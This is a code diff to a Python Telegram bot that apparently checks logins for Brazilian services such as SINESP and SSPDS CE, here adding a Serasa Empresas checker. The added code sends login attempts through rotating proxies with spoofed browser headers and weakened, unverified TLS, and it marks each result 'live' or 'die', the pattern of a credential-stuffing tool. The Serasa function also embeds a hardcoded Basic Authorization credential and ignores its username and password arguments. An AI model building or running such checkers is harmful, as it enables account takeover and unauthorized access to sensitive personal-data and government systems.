@@ -12,6 +12,7 @@ import logging
 import os
 import random
 import sqlite3
+import ssl
 import time
 from pathlib import Path
 
@@ -19,6 +20,7 @@ import requests
 import urllib3
 from bs4 import BeautifulSoup
 from dotenv import load_dotenv
+from requests.adapters import HTTPAdapter
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
     Application,
@@ -30,10 +32,31 @@ from telegram.ext import (
     MessageHandler,
     filters,
 )
+from urllib3.util.ssl_ import create_urllib3_context
 
 load_dotenv()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.WARNING)
+
+class _LegacyTLSAdapter(HTTPAdapter):
+    """Alguns servidores (ex.: Serasa) recusam o handshake TLS padrão do
+    OpenSSL 3.x (SECLEVEL=2). Baixar pra SECLEVEL=1 resolve o
+    SSLV3_ALERT_HANDSHAKE_FAILURE; check_hostname/verify_mode são
+    desligados aqui para evitar conflito ao usar verify=False."""
+
+    def init_poolmanager(self, *args, **kwargs):
+        ctx = create_urllib3_context(ciphers="DEFAULT@SECLEVEL=1")
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        kwargs["ssl_context"] = ctx
+        return super().init_poolmanager(*args, **kwargs)
+
+    def proxy_manager_for(self, *args, **kwargs):
+        ctx = create_urllib3_context(ciphers="DEFAULT@SECLEVEL=1")
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        kwargs["ssl_context"] = ctx
+        return super().proxy_manager_for(*args, **kwargs)
 
 # ── Config ──────────────────────────────────────────────────────────────────────
 TOKEN    = os.environ["BOT_TOKEN"]
@@ -54,6 +77,7 @@ CHECKERS = {
     "sspds":         "SSPDS CE",
     "checkonn":      "CheckONN",
     "sinesp":        "SINESP",
+    "serasa":        "Serasa Empresas",
 }
 
 # ── Database ────────────────────────────────────────────────────────────────────
@@ -450,6 +474,32 @@ def _chk_checkonn(user, pwd, px_fn):
     except Exception as e:
         return ("erro", str(e)[:60])
 
+def _chk_serasa(user, pwd, px_fn):
+    try:
+        s = requests.Session()
+        s.mount("https://", _LegacyTLSAdapter())
+        r = s.post(
+            "https://sitenet.serasa.com.br/security/iam/v1/user-identities/login?clientId=5ecebf45aae366236fd0b584",
+            headers={
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Language": "pt-BR,pt;q=0.9",
+                "Authorization": "Basic NDA5NDEzNDQ6TmVxQDE3NTA=",
+                "Content-Type": "application/json",
+                "Origin": "https://empresas.serasaexperian.com.br",
+                "Referer": "https://empresas.serasaexperian.com.br/",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+            },
+            json={"deviceId": "6a4442efb2b2e725cb1a4551", "deviceVersion": "V2"},
+            proxies=px_fn(), timeout=15, verify=False,
+        )
+        data  = r.json()
+        token = data.get("accessToken")
+        if token and token != "null":
+            return ("live", f"token:{str(token)[:20]}...")
+        return ("die", "")
+    except Exception as e:
+        return ("erro", str(e)[:60])
+
 CHECKER_FN = {
     "checkok":       _chk_checkok,
     "consultcenter": _chk_consultcenter,
@@ -460,6 +510,7 @@ CHECKER_FN = {
     "sspds":         _chk_sspds,
     "checkonn":      _chk_checkonn,
     "sinesp":        _chk_sinesp,
+    "serasa":        _chk_serasa,
 }
 
 # ── Proxy generator (admin only) ────────────────────────────────────────────────
